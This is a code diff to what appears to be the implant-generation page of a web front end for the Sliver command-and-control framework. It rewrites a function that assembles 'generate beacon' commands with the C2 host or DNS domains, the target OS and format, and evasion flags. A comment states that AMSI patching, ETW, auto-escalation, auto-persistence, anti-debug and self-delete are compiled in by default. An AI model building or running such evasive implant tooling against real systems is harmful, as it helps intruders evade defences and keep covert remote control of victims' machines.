@@ -145,17 +145,46 @@ export default function Generate() {
   }
 
   function buildCommand(): string {
-    let cmd = `generate`
-    if (beacon) cmd += ' --beacon'
-    cmd += ` --${protocol} ${c2host}:${c2port}`
-    cmd += ` --os ${os} --arch ${arch}`
-    cmd += ` --format ${format}`
+    // Map OS → GOOS
+    const goos = os === 'macos' ? 'darwin' : os
+
+    // Map UI format names → Sliver CLI format values
+    let genFormat = format
+    switch (format) {
+      case 'apk': case 'elf': case 'macho': case 'sh': case 'script': genFormat = 'exe';      break
+      case 'dll': case 'so':  case 'dylib':                            genFormat = 'shared';   break
+      case 'bin':                                                       genFormat = 'shellcode'; break
+    }
+
+    // Base subcommand
+    let cmd = beacon ? 'generate beacon' : 'generate'
+
+    // C2 connection (DNS uses domain names, not host:port)
+    if (protocol === 'dns' && domains.trim()) {
+      cmd += ` --dns ${domains.trim()}`
+    } else {
+      cmd += ` --${protocol} ${c2host}:${c2port}`
+    }
+
+    cmd += ` --os ${goos} --arch ${arch}`
+    if (genFormat !== 'exe') cmd += ` --format ${genFormat}`
     if (name) cmd += ` --name ${name}`
-    if (evasion.obfuscate)      cmd += ' --obfuscate'
-    if (evasion.sandbox_detect) cmd += ' --sandbox-detect'
-    if (evasion.amsi_bypass && os === 'windows') cmd += ' --skip-symbols=false'
-    if (beacon) cmd += ` --interval ${interval}s --jitter ${jitter}`
-    if (domains) cmd += ` --domains ${domains}`
+
+    // Valid evasion CLI flags
+    if (evasion.ntdll_unhook || evasion.stack_spoof || evasion.indirect_syscall) cmd += ' --evasion'
+    if (evasion.sleep_obfuscation)            cmd += ' --sleep-obfuscation'
+    if (evasion.sandbox_detect)               cmd += ' --sandbox-detection'
+    if (evasion.amsi_bypass || evasion.api_hashing) cmd += ' --api-hashing'
+    // (AMSI patch, ETW, auto-escalate, auto-persist, watchdog, anti-debug,
+    //  self-delete are compile-time always-on via hardenx_*.go — no CLI flag needed)
+
+    // Beacon interval (--seconds + --jitter, both in seconds)
+    if (beacon) {
+      cmd += ` --seconds ${interval}`
+      if (jitter > 0) cmd += ` --jitter ${jitter}`
+    }
+
+    cmd += ' --save /tmp/'
     return cmd
   }
 
